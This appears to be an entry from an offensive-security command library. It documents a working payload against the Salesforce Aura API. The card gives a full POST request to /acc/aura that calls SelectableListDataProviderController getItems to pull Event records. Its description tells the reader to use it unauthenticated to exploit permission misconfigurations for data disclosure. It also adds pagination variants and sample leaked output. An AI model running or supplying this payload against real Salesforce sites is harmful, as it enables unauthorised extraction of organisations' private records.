---
id: cmd-uuid-1
data: >-
  {"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Event","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}
tags:
  - aura-api
  - query-payload
  - information-disclosure
type: command
output: 'JSON response with Event records array under actions[0].returnValue.items'
executor: http
platforms:
  - Web
  - Salesforce
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:13.185Z'
verified: false
validated: true
submitted: true
---
# salesforce-aura-event-query

## Command

This is a JSON payload used in the 'message' parameter of a POST request to Salesforce Aura API.

```http
POST /acc/aura HTTP/1.1
Host: target.force.com
Content-Type: application/x-www-form-urlencoded

aura.id=...&aura.token=...&message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Event","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}
```

## Description

This payload invokes the SelectableListDataProviderController's getItems action to query the 'Event' object, fetching up to 100 records with full layout details. Use in unauthenticated contexts to exploit permission misconfigurations for data disclosure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| entityNameOrId | Object to query (e.g., 'Event') | Yes |
| layoutType | Record layout ('FULL' for all fields) | Yes |
| pageSize | Records per page (100 max) | Yes |
| currentPage | Starting page (0 for first) | Yes |
| useTimeout | Enable timeout (false for no) | No |
| getCount | Retrieve total count (false) | No |
| enableRowActions | Enable actions on rows (false) | No |

## Examples

### Basic Usage

Inject as POST body parameter to /acc/aura:

```http
message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Event","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}
```

### Advanced Usage

For pagination, increment currentPage:

```http
{"actions":[{"id":"123;a","descriptor":".../ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Event","layoutType":"FULL","pageSize":100,"currentPage":1,"useTimeout":false,"getCount":true,"enableRowActions":false}}]}
```

## Expected Output

Successful response: {"actions":[{"returnValue":{"items":[{"attributes":{"type":"Event","url":"/services/data/..."},"Id":"001...","Subject":"Internal Meeting","StartDateTime":"2023-...",...}],"totalSize":150}}]}

## Related

- [[procedures/Inject-Event-Object-Query-Payload]]
- [[tools/Burp-Suite]]
